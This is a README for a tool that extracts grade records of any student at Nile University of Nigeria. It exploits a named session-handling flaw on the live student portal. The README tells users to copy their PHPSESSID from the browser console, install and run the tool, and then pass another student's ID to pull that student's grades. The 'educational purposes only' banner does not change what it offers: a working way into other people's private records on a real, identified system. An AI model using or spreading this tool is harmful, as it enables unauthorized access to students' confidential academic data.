# Nile University Student Portal Grade Extractor

> [!WARNING]
> **Educational Purposes Only:** This project is designed strictly for educational evaluation and security research.

This utility allows you to view the academic results of any student at Nile University of Nigeria. This is possible because the university portal's backend architecture does not tie an active `PHPSESSID` session key uniquely to the authenticated user ID when requesting the grade module endpoint. An active session key remains universally authoritative across the system until it is invalidated by a timeout. If a session expires, you simply need to re-authenticate via your web browser to re-activate the token string.

---

## Technical Overview & Token Retrieval

To extract a valid session token:

1. Navigate to the portal via your desktop browser: `https://sis.nileuniversity.edu.ng/my/index.php`
2. Authenticate using your credentials.
3. Open your browser's Developer Tools (`F12` or `Right-Click` -> **Inspect**).
4. Select the **Console** tab, execute the following command, and copy the resultant value:
```javascript
document.cookie

```


5. Extract the string matching the pattern `PHPSESSID=sessionkey`.

---

## Quick Start & Environment Setup

### macOS & Linux

Execute the following commands in your terminal to install the runtime engine, clone the source repository, and execute your first payload:

```bash
# Install Bun runtime environment
curl -fsSL https://bun.sh/install | bash
source ~/.bashrc

# Clone the repository and navigate into the source root
git clone https://github.com/zevlion/result-extractor.git
cd result-extractor

# Install parsing dependencies
bun install

# Initialize your session token and print your profile results
bun index.ts --cookie "PHPSESSID=your_session_key_here"

```

### Windows (PowerShell)

Execute the following commands within an elevated PowerShell terminal session:

```powershell
# Install Bun runtime environment
powershell -c "irm bun.sh/install.ps1 | iex"

# Refresh environment variables for the active terminal session
$env:Path += ";$env:USERPROFILE\.bun\bin"

# Clone the repository and navigate into the source root
git clone https://github.com/zevlion/result-extractor.git
cd result-extractor

# Install parsing dependencies
bun install

# Initialize your session token and print your profile results
bun index.ts --cookie "PHPSESSID=your_session_key_here"

```

---

## Query Examples

### Run via Saved Session

Once the configuration artifact has cached your token locally, execute the compiler pass directly with no arguments to pull your default personal profile:

```bash
bun index.ts

```

### Targeted Cross-Profile Extraction

To query and inspect structural details, and grading tables of any specific student ID across the database, append the identifier flag:

```bash
bun index.ts --id "25212..."

```
